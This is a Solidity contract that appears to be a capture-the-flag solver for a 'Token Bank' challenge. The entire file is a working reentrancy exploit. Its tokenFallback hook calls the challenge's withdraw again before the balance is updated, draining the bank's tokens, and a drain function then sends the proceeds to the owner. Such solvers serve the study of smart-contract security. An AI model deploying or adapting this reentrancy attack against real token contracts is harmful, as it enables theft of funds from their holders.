pragma solidity ^0.4.21;

interface IToken {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface ITokenBankChallenge {
    function token() external view returns (address);
    function withdraw(uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
}

contract TokenBankSolver {
    ITokenBankChallenge public challenge;
    IToken public token;
    address public owner;
    bool public attacking;

    event Log(string message);
    event LogUint(string label, uint256 value);
    event LogAddress(string label, address addr);

    function TokenBankSolver(address _challenge) public {
        owner = msg.sender;
        challenge = ITokenBankChallenge(_challenge);
        token = IToken(challenge.token());
    }

    function seed() public {
        uint256 bal = token.balanceOf(address(this));
        emit LogUint("Seed: transferring tokens", bal);
        token.transfer(address(challenge), bal);
    }

    function attack() public {
        attacking = true;
        uint256 myBalance = challenge.balanceOf(address(this));
        emit LogUint("Attacker balance before withdraw", myBalance);
        challenge.withdraw(myBalance);
    }

    function tokenFallback(address /*from*/, uint256 /*value*/, bytes /*data*/) external {
        emit Log("tokenFallback triggered");

        if (!attacking) {
            emit Log("Not attacking yet");
            return;
        }

        uint256 challengeTokenBalance = token.balanceOf(address(challenge));
        uint256 myInternalBalance = challenge.balanceOf(address(this));

        emit LogUint("Challenge token balance", challengeTokenBalance);
        emit LogUint("My internal balance", myInternalBalance);

        if (myInternalBalance > 0 && challengeTokenBalance > 0) {
            emit Log("Reentering...");
            challenge.withdraw(myInternalBalance);
        }
    }

    function drain() public {
        uint256 bal = token.balanceOf(address(this));
        emit LogUint("Draining tokens", bal);
        token.transfer(owner, bal);
    }
}
